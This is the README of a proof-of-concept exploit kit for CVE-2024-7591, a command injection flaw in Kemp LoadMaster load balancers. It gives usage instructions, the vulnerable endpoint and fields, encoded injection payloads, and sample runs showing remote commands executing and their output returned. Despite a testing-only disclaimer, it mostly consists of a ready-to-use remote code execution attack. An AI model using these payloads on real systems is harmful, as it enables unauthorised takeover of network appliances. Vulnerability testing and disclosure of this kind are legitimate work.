# CVE-2024-7591-PoC
These PoC python scripts test the Kemp LoadMaster for remote code execution.

THIS TOOL IS INTENDED FOR TESTING PURPOSES ONLY

These scripts were based on Marius Walter's writeup on the specifics of this exploit. You can read their post at:
https://insinuator.net/2024/11/vulnerability-disclosure-command-injection-in-kemp-loadmaster-load-balancer-cve-2024-7591/

This is a python3 script meant for testing a LoadMaster against CVE-2024-7591.


USAGE:

KempRCECommandGenerator.py is meant to take a bash command and convert it in to an encoded form that can be used to run
remote commands against a vulnerable LoadMaster. The output of this code is meant to be used in conjunction with Burp
Suite or some other tool to send remote commands to the server.

Example:
```
$: python3 ./KempRCECommandGenerator.py
Enter your command: echo hello
Put this output in the token, token2, user, or pass field
in the POST request to /progs/status/login.

%01%78%27%3b%65%63%68%6f%20%68%65%6c%6c%6f%3b%65%63%68%6f%20%27%01

$: 
```
Your command output should be present in the response after the HTTP headers and before the html code.




KempExploit.py is meant to be an independent use python script for testing if the vulnerability is exploitable or running
custom code.

PREREQUISITES:

requests

urllib3

bs4

You will need to update some variables in the script, like IP address, port and https vs http.

Example:
```
$: python3 ./KempExploit.py
Enter your command to send or leave blank to test: 
It looks like I found a target and some tokens. Do you want to proceed? [y/N]y
Login POST status code: 200
âœ… 'exploitable' found in response, erver confirmed vulnerable."
$:

Example 2:
$: python3 ./KempExploit.py
Enter your command to send or leave blank to test: ping -c2 10.0.0.5
Running the command ping -c2 10.0.0.5
The encoded command looks like: %01%78%78%27%3b%70%69%6e%67%20%2d%63%32%20%31%30%2e%30%2e%30%2e%35%3b%65%63%68%6f%20%27%01
Login POST status code: 200
Response body:
ping 10.0.0.5 (10.0.0.5) 56(84) bytes of data.
64 bytes from 10.0.0.5: icmp_seq=1 ttl=63 time=3.19 ms
64 bytes from 10.0.0.5: icmp_seq=2 ttl=63 time=8.41 ms
<!DOCTYPE html>
<html>
<head>
<script>
alert("Login Failed");
</script>
<script>
if(parent && parent != window){
parent.location = "/";
parent.location.reload(true);
}
</script>
</head>
</html>
$: 
```


